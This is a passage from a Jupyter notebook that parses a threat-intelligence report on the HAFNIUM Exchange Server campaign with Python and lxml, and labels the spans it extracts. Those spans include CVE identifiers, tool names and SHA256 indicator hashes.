   "outputs": [
    {
     "data": {
      "text/html": [
       "<table>\n",
       "<tbody>\n",
       "<tr><td>Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to</td><td>   </td><td>&lt;Element p at 0x1333f9648&gt;</td><td>text</td><td>(3, 498)  </td><td>(0, 495)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              </td><td>   </td><td>&lt;Element p at 0x1333f9648&gt;</td><td>tail</td><td>(739, 740)</td><td>(0, 1)    </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>HAFNIUM                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </td><td>   </td><td>&lt;Element a at 0x1333f9688&gt;</td><td>text</td><td>(103, 110)</td><td>(0, 7)    </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>, a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.                                                                                                                                                                                                                                                                                                                                                                                   </td><td>   </td><td>&lt;Element a at 0x1333f9688&gt;</td><td>tail</td><td>(114, 237)</td><td>(0, 123)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;description&#x27;), group=0, role=None)</td></tr>\n",
       "<tr><td>CVE-2021-26855                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(50, 64)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-26857                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(66, 80)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-26858                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(82, 96)  </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>CVE-2021-27065                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>CVE</td><td>&lt;Element p at 0x1333f96c8&gt;</td><td>text</td><td>(3, 160)  </td><td>(102, 116)</td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>Azure Sentinel                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </td><td>   </td><td>&lt;Element a at 0x1333f9808&gt;</td><td>text</td><td>(69, 83)  </td><td>(0, 14)   </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "<tr><td>Covenant                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </td><td>   </td><td>&lt;Element a at 0x1333f99c8&gt;</td><td>text</td><td>(34, 42)  </td><td>(0, 8)    </td><td>Label(type=(&#x27;pulse&#x27;, &#x27;tag&#x27;), group=0, role=None)        </td></tr>\n",
       "</tbody>\n",
       "</table><p>Showing 10 of 38 rows"
      ],
      "text/plain": [
       "[('Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to ', None, <Element p at 0x1333f9648>, 'text', (3, 498), (0, 495), Label(type=('pulse', 'description'), group=0, role=None)), ('\\n', None, <Element p at 0x1333f9648>, 'tail', (739, 740), (0, 1), Label(type=('pulse', 'description'), group=0, role=None)), ('HAFNIUM', None, <Element a at 0x1333f9688>, 'text', (103, 110), (0, 7), Label(type=('pulse', 'description'), group=0, role=None)), (', a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.', None, <Element a at 0x1333f9688>, 'tail', (114, 237), (0, 123), Label(type=('pulse', 'description'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (50, 64), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (66, 80), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (82, 96), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element p at 0x1333f96c8>, 'text', (3, 160), (102, 116), Label(type=('pulse', 'tag'), group=0, role=None)), ('Azure Sentinel', None, <Element a at 0x1333f9808>, 'text', (69, 83), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('Covenant', None, <Element a at 0x1333f99c8>, 'text', (34, 42), (0, 8), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9b88>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element a at 0x1333f9c08>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element a at 0x1333f9c88>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9c88>, 'tail', (139, 478), (253, 267), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element a at 0x1333f9d08>, 'text', (63, 77), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element a at 0x1333f9d08>, 'tail', (139, 478), (253, 267), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element li at 0x133400748>, 'text', (4, 91), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element li at 0x133400ac8>, 'text', (4, 76), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element li at 0x133400d48>, 'text', (4, 87), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element li at 0x13340c048>, 'text', (4, 86), (0, 14), Label(type=('pulse', 'tag'), group=0, role=None)), ('b75f163ca9b9240bf4b37ad92bc7556b40a17e27c2b8ed5c8991385fe07d17d0', 'FileHash-SHA256', <Element li at 0x13340c4c8>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=8, role=None)), ('097549cf7d0f76f0d99edf8b2d91c60977fd6a96e4b8c3c94b0b1733dc026d3e', 'FileHash-SHA256', <Element li at 0x13340c508>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=1, role=None)), ('2b6f1ebb2208e93ade4a6424555d6a8341fd6d9f60c25e44afe11008f5c1aad1', 'FileHash-SHA256', <Element li at 0x13340c548>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=3, role=None)), ('65149e036fff06026d80ac9ad4d156332822dc93142cf1a122b1841ec8de34b5', 'FileHash-SHA256', <Element li at 0x13340c588>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=6, role=None)), ('511df0e2df9bfa5521b588cc4bb5f8c5a321801b803394ebc493db1ef3c78fa1', 'FileHash-SHA256', <Element li at 0x13340c5c8>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=5, role=None)), ('4edc7770464a14f54d17f36dc9d0fe854f68b346b27b35a6f5839adf1f13f8ea', 'FileHash-SHA256', <Element li at 0x13340c608>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=4, role=None)), ('811157f9c7003ba8d17b45eb3cf09bef2cecd2701cedb675274949296a6a183d', 'FileHash-SHA256', <Element li at 0x13340c648>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=7, role=None)), ('1631a90eb5395c4e19c7dbcbf611bbe6444ff312eb7937e286e4637cb9e72944', 'FileHash-SHA256', <Element li at 0x13340c688>, 'text', (4, 68), (0, 64), Label(type=('indicator', 'FileHash-SHA256'), group=2, role=None)), ('Procdump', None, <Element a at 0x13340d508>, 'text', (75, 83), (0, 8), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26855', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (242, 256), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (258, 272), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-27065', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (274, 288), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element p at 0x13340d648>, 'text', (3, 311), (293, 307), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26858', 'CVE', <Element p at 0x13340e208>, 'text', (3, 221), (189, 203), Label(type=('pulse', 'tag'), group=0, role=None)), ('CVE-2021-26857', 'CVE', <Element p at 0x13340e348>, 'text', (3, 154), (122, 136), Label(type=('pulse', 'tag'), group=0, role=None)), ('powershell.exe', 'FilePath', <Element code at 0x13340e588>, 'text', (6, 187), (66, 80), Label(type=('pulse', 'tag'), group=0, role=None)), ('powershell.exe', 'FilePath', <Element code at 0x13340e648>, 'text', (6, 223), (77, 91), Label(type=('pulse', 'tag'), group=0, role=None)), ('powershell.exe', 'FilePath', <Element code at 0x13340e708>, 'text', (6, 345), (77, 91), Label(type=('pulse', 'tag'), group=0, role=None))]"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "seq(analyzer.primary_subtree_leafs).map(product_by_contents).flatten().starmap(\n",
    "    product_by_entities\n",
    ").flatten().starmap(\n",
    "    lambda element, content, text: (\n",
    "        text.string,\n",
    "        text.entity,\n",
    "        # element.sourceline,\n",
    "        element,\n",
    "        content.property,\n",
    "        content.span,\n",
    "        text.span,\n",
    "    )\n",
    ").starmap(\n",
    "    lambda string, entity, element, prop, content_span, text_span: (\n",
    "        string,\n",
    "        entity,\n",
    "        element,\n",
    "        prop,\n",
    "        content_span,\n",
    "        text_span,\n",
    "        el.match_label(element)\n",
    "        if el.match_label(element) is not None\n",
    "        else fl.match_label(string, method=\"fuzzy_match\"),\n",
    "    )\n",
    ").distinct().filter(\n",
    "    lambda x: x[6] != None\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "formating_text_label = (\n",
    "    seq(analyzer.primary_subtree_leafs)\n",
    "    .filter(\n",
    "        lambda element: seq(element.iterdescendants()).intersection(\n",
    "            analyzer.primary_subtree_leafs\n",
    "        )\n",
    "    )\n",
    "    .map(lambda element: [element] + list(element.iterdescendants()))\n",
    "    .map(\n",
    "        lambda elements: (\n",
    "            elements,\n",
    "            seq(elements)\n",
    "            .map(product_by_contents)\n",
    "            .flatten()\n",
    "            .starmap(product_by_entities)\n",
    "            .flatten()\n",
    "            .starmap(lambda element, content, text: text.string)\n",
    "            .make_string(\" \"),\n",
    "        )\n",
    "    )\n",
    "    .starmap(lambda elements, string: product(elements, [string]))\n",
    "    .flatten()\n",
    "    .starmap(\n",
    "        lambda element, string: (element, fl.match_label(string, method=\"fuzzy_match\"))\n",
    "    )\n",
    "    .filter(lambda element_label: element_label[1] is not None)\n",
    "    .to_dict()\n",
    ")\n",
    "\n",
    "formating_text_label\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "seq(analyzer.primary_subtree_leafs).map(product_by_contents).flatten().starmap(\n",
    "    product_by_entities\n",
    ").flatten().starmap(\n",
    "    lambda element, content, text: (\n",
    "        text.string,\n",
    "        text.entity,\n",
    "        # element.sourceline,\n",
    "        element,\n",
    "        content.property,\n",
    "        content.span,\n",
    "        text.span,\n",
    "    )\n",
    ").starmap(\n",
    "    lambda string, entity, element, prop, content_span, text_span: (\n",
    "        string,\n",
    "        entity,\n",
    "        element,\n",
    "        prop,\n",
    "        content_span,\n",
    "        text_span,\n",
    "        fl.match_label(string, method=\"fuzzy_match\"),\n",
    "        formating_text_label.get(element),\n",
    "    )\n",
    ").distinct().filter(\n",
    "    lambda x: x[6] != None or x[7] != None\n",
    ")\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "lxml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "magpie-j27h1SjX-py3.6",
   "language": "python",
   "name": "magpie-j27h1sjx-py3.6"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.10"
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
